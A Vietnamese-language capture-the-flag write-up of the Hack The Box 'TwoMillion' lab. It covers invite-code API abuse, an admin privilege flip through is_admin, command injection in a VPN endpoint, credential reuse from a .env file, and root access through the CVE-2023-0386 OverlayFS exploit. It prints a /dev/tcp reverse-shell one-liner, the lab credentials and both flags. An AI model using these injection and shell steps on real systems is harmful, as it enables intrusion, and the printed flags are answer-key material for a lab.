---
title: HTB TwoMillion
published: 2025-08-02
tags: [HTB, Linux, Easy]
category: Writeups
author: Trohan0x00
draft: false
image: "/src/content/posts/assets/twomillion.png"
---
# HTB Labs: Two Million
## I. User Flag
Mình được cấp 1 IP tương tự các machine khác, tiến hành truy cập và scan trước bằng nmap 
![image](https://hackmd.io/_uploads/rJQgmW3Bxg.png)
Thấy được chỉ có mỗi 2 services là `ssh` và `nginx` mình sẽ tiến hành recon cả hai
Mình sẽ tiến hành recon web server trước vì hiện tại chưa có thông tin về user của ssh
![image](https://hackmd.io/_uploads/SkiBmZ2Sxx.png)
Đây có lẽ là một trang intro về HTB, hoặc gì đó tương tự vậy. Để biết rõ hơn về directory của web này mình sẽ scan dir thử xem có gì đặc biệt
![image](https://hackmd.io/_uploads/rJXtpK3Dlx.png)
Mình thấy một vài dir thú vị, mình sẽ thử `/register` xem có gì đặc biệt
![image](https://hackmd.io/_uploads/rkEhaK2vgl.png)
Ta thấy đây là một trang đăng ký bình thường, nhưng để đăng ký được thì ta cần có một `invite code`, đây là một trường input nhưng mình không thể nhập được. View source mình thấy một điều thú vị
![image](https://hackmd.io/_uploads/HJ6rAKnPee.png)
Đoạn js này dùng để lấy mã `invite code` từ `localStorage` vầ ở trên ta có thể thấy thêm một file `inviteapi.min.js` tiến hành vào kiểm tra thì có vẽ như đã bị `obfuscated`
```javascript 
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
Đây là dạng `eval obfuscation` để tránh mất thời gian mình sẽ dùng [beautifer](https://beautifier.io) để tiến hành `deobs`
```javascript 
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```
Kết quả trả về ta có 2 `function` một là dùng để check `invite code` và cái còn lại là tạo ra `invite code`. Nói về `function` `makeInviteCode()` thì ta có thể thấy rằng nó gửi một `post req` đến `/api/v1/invite/how/to/generate` để lấy mã `invite code` từ đây và tiến hành thiết lập mã mời. Có lẽ endpoint này có thể khai thác thêm gì đó. Mình sẽ tiến hành post một `req` đến `API` để xem thử có dữ liệu gì được trả về không
![image](https://hackmd.io/_uploads/SJuUl62wee.png)
Như ta thấy, nó trả về nội dung như này, và `data` đã bị encode nhưng giờ vẫn chưa biết thuật toán dùng để encode là gì. Nhưng bên dưới lại để `entype: ROT13` nên mình sẽ decode với `RÓT13` xem
![image](https://hackmd.io/_uploads/HJJJbahvle.png)
Ta nhận được thông điệp là hãy dùng `post req` đến endpoint trên 
![image](https://hackmd.io/_uploads/r1rMZpnwle.png)
Ta tiếp tục nhận lại `data` như trên, nhưng về `data` này có vẻ như dễ dàng nhận biết được encode bằng `B64`
![image](https://hackmd.io/_uploads/SyEIWT3vlx.png)
Ta nhận lại một đoạn mã, có vẽ như chính là `invite code` nếu như không lầm thì đây chính là endpoint sẽ cung cấp `invite code` cho phía `function` ở đoạn code js truớc. Giờ mình sẽ dùng `invite code` này để reg một account
![image](https://hackmd.io/_uploads/HJDfzTnDlg.png)
![image](https://hackmd.io/_uploads/rJofG63vlg.png)
Sau khi reg thành công, ta đã vào được trang chính như trên. OK Khi vào được trang này và đã có thêm cookie. Mình sẽ tiến hành để scan dir thêm một lần nữa để xem có thể phát hiện thêm gì mới không
![image](https://hackmd.io/_uploads/BJUulxpwxe.png)
Mình thấy có thêm một dir là `/api` trả code 200 nên quyết định check thử 
![image](https://hackmd.io/_uploads/HJgAxeTvxl.png)
Ta biết thêm một dir là `/api/v1` 
![image](https://hackmd.io/_uploads/rJt-bxaPge.png)
Đây là một list `API` của version và được phân cấp theo từng người dùng. Ta có thể thấy được `/api/v1/admin` và `/api/v1/user` được chia theo từng cách call với từng method như `GET`, `POST`. Có lẽ đây là nơi mà các lệnh call `API` ở file js vừa rồi mình quan sát được nhưng không thể truy cập vào xem khi chưa có user. Có lẽ sẽ có nhiều thông tin để khai thác
Sau một lúc truy vấn thì mình phát hiện được ta có thể dùng `PUT req` đến `/api/v1/admin/settings/update`, sau khi gửi `req` đến thì ta nhận được các thông báo lỗi có thể giúp ích được rất nhiều, cụ thể
![image](https://hackmd.io/_uploads/H1qAyyCDxe.png)
Cụ thể ở `req` đầu ta nhận được `res` báo về do chưa có `content-type` hợp lệ, do `data` trả về dưới dạng json nên mình nghĩ `data` gửi hợp lệ cũng sẽ là json 
![image](https://hackmd.io/_uploads/ryeMxkCPle.png)
Sửa xong tiếp tục gửi `req` thì nhận được là thiếu param email mình lập tức thêm email vào `req` để gửi đi . Tiếp đến nó lại yêu cầu có param `is_admin`. Mình nghĩ đây là một param nhận `boolen_value` nên mình sẽ thử với `is_admin:1`
![image](https://hackmd.io/_uploads/rkl6xyADlg.png)
Kết quả ta nhận được `res` như này. Giờ có lẽ ta đã hoàn toàn có thể cấp quyền admin cho user của ta. Để test thử xem thì mình sẽ call một API admin khác
![image](https://hackmd.io/_uploads/H1JibJCwlg.png)
Hoàn toàn call thành công. Và sau khi call với `/api/v1/admin/auth` thì `res` trả về là true chứng tỏ việc leo quyền user đã thành công và giờ ta đã là `admin`
![image](https://hackmd.io/_uploads/HJfAlgCPge.png)
Tiếp theo là gửi `Post req` đến `/api/v1/admin/vpn/generate` để xem có thể khai thác gì từ `API` cuối cùng này không. Thì ta có thể thấy được nó yêu cầu thêm param là `username`
![image](https://hackmd.io/_uploads/SknQWeCvxg.png)
Và `API` này nhận bát kỳ giá trị nào của param `username`, do đó có khả năng sẽ bị `Command Injection`. Ta sẽ tiến hành thử detect
![image](https://hackmd.io/_uploads/BkWczWCDle.png)
Chỉ với việc inject đơn giản, ta đã có thể detect được lỗ hỏng. Để dễ dàng khai thác, ta cần đưa reverse shell vào để lấy shell thuận lợi cho việc khai thác hơn
```shell!
sh -i >& /dev/tcp/10.10.10.10/4242 0>&1
```
Mình sẽ dùng `bash`, sau đó chỉ cần inject vào là ta đẫ lấy được `reverse shell`.
![image](https://hackmd.io/_uploads/B1PE5GCvgg.png)
Ta thấy dễ dàng lấy được `reverse shell`, và user hiện tại là `www-data`. Không phải `admin` nên các quyền hạn hiện tại còn hạn chế. Sau một xem thử thì mình tìm được một file `.env`
![image](https://hackmd.io/_uploads/r17FO4APgg.png)
Khi cat ra ta được một credential của `admin`. Mình nghĩ đây có lẽ là credential của admin trong server `ssh`. Còn nhớ khi ta scan IP thì có 2 services 1 là `web server` 2 là `ssh`
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
Giờ mình sẽ thử login với credential này xem 
![image](https://hackmd.io/_uploads/H1bWt40Dxx.png)
Ta đã thành công vào được `ssh server`. `ls` ra thì có file `user.txt`. Đây chính là file chứa `user flag` của ta, ban đầu khi vọc ở `reverse shell`, mình thấy được một dir là `/home/admin/user.txt` nhưng lúc đó lại không có quyền để đọc file. Giờ thì đã thành công lấy được `user flag`

> 79f5d11adcf863aadc6d588a6fbbe4a6

## II. Root Flag
Sau khi tìm được `user flag`, mình bắt đầu đi tìm `root flag` nhưng loay hoay mãi vẫn chưa tìm được thêm thông tin gì về lỗ hỏng để leo quyền và thông tin liên quan. Có check hint thì mình cần kiểm tra thêm về nơi lưu trữ các mail của `Linux system`. Sau một lúc search thì thấy được các mail được gửi đến sẽ được lưu ở `/var/mail`. Đi vào để kiểm tra thì nhận được một bản email gửi đến `admin` như sau
```mail
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
Email này là một thông điệp nội bộ, gửi từ một nhân viên tên là `ch4p` đến `admin` và cc cho `g0blin`, với nội dung liên quan đến việc vá lỗi bảo mật hệ thống.
Tìm hiểu về `CVE-2023-0386` này thì lỗ hổng này cho phép một người dùng thông thường có thể chiếm quyền `root `bằng cách lợi dụng cơ chế sao chép file (copy-up) của `OverlayFS`. Cụ thể, khi một file có quyền `setuid` được sao chép từ một lớp file hệ thống ảo (FUSE) lên lớp ghi (upper layer), `OverlayFS` đã không loại bỏ quyền `setuid` này, cho phép kẻ tấn công thực thi file với quyền root.
Sau một lúc tìm kiếm thì mình tìm được `POC` và cũng như là payload exploit của `CVE` này [ở đây](https://github.com/sxlmnwb/CVE-2023-0386)
OK giờ ta đã có payload exploit. Tiếp đến là dựng server đẻ upload zip này lên máy victim. Mình sẽ dựng `Python server` để upload
![image](https://hackmd.io/_uploads/rkwLZhldee.png)
Có vẻ như ta không có quyền uplaod ở cả user thường và admin ở phía ssh. Giờ ta cần phải upload bằng `scp`

```bash!
sshpass -p SuperDuperPass123 scp CVE-2023-0386-master.zip admin@10.10.11.221:/tmp/         
```
Ta sẽ upload thông qua credential ssh mà ta đã có và lưu ở tmp. Cách khai thác thì tiến hành mở 2 terminal do đây là `SSH Server` nên mình sẽ start 2 sessions. Ở session 1 ta sẽ run `./fuse ./ovlcap/lower ./gc`
Và tiếp theo ở session 2 là `./exp`
![image](https://hackmd.io/_uploads/SJQHiyZOeg.png)
Như ta đã thấy, giờ hoàn toàn đã leo quyền thành công. Do đây là một bài labs để khai thác nên mình sẽ chưa tìm hiểu kỹ về `CVE` này ở blog này nên chỉ cần dùng payload exploit đã công bố là được giờ ta chỉ cần đọc root flag ở `/root/root.txt`
> 0f080a26c0360745340c0b6f5b3a407b



